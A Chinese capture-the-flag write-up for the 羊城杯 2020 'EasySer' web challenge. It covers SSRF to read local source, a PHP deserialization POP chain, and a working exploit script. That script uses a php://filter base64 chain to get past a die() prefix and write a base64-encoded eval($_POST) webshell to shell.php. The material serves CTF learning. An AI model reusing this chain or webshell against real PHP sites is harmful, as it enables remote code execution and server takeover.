# 原创
：  [羊城杯 2020]EasySer

# [羊城杯 2020]EasySer

#### [羊城杯 2020]EasySer

## EasySer

### 考点

> 
1） PHP 基础代码审计<br/> 2） SSRF本地文件读取<br/> 3） 反序列化写入webshell，绕过死亡绕过


### 思路

> 
1） 源码写了不安全协议从本地，想到http 和127.0.0.1<br/> 2） 读源码看反序列化，写入shell<br/> 3） 伪协议base64绕过die()，rot13等等都可以


### Payload

> 
buuctf上做这道题时，页面让我一脸茫然，一度怀疑环境坏了…


> 
没啥好利用的东西，用脚本扫一下敏感信息发现存在robots.txt，提示我们`/star1.php`


> 
F12查看提示我们用不安全的协议读取ser.php文件，利用`http://127.0.0.1/star1.php`试试，得到ser.php的源码


```
&lt;?php
error_reporting(0);
if ( $_SERVER['REMOTE_ADDR'] == "127.0.0.1" ) {
    highlight_file(__FILE__);
} 
$flag='{Trump_:"fake_news!"}';

class GWHT{
    public $hero;
    public function __construct(){
        $this-&gt;hero = new Yasuo;
    }
    public function __toString(){
        if (isset($this-&gt;hero)){
            return $this-&gt;hero-&gt;hasaki();
        }else{
            return "You don't look very happy";
        }
    }
}
class Yongen{ //flag.php
    public $file;
    public $text;
    public function __construct($file='',$text="") {
        $this -&gt; file = $file;
        $this -&gt; text = $text;
        
    }
    public function hasaki(){
        $d   = '&lt;?php die("nononon");?&gt;';
        $a= $d. $this-&gt;text;
         @file_put_contents($this-&gt; file,$a);
    }
}
class Yasuo{
    public function hasaki(){
        return "I'm the best happy windy man";
    }
}

```

> 
构造POC链，我们利用伪协议将一句话木马写入文件中


```
&lt;?php
class GWHT{
	public $hero;
}
class Yongen{
    public $file;
    public $text;
}
$door = new GWHT();
$door-&gt;hero = new Yongen();
$door-&gt;hero-&gt;file = 'php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php';
$door-&gt;hero-&gt;text = 'PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==';
echo urlencode(serialize($door))."\n";
?&gt;

```

> 
蚁剑测试连接shell.php


> 
获取flag，这里的flag并不是根目录下的/flag

